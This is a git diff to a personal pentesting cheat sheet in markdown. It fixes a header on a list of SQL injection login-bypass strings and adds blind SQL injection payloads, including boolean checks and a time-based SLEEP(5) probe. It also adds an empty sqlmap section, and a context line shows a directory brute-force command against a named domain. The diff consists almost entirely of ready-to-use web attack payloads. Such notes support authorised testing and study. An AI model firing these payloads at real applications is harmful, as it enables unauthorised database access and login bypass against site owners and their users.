@@ -53,13 +53,26 @@ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.w
 ### SQLi
 ---
 
-**Authentication Bypass
+**Authentication Bypass**
 ```
 admin' --
 ' or 1=1--
 ' or '1'='1
 ' or '1'='1 --
 ```
+
+**Verification: Blind SQLi**
+```
+%' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
+%' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
+company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
+```
+
+**Sqlmap Commands**
+```
+
+```
+
 
 
 ---
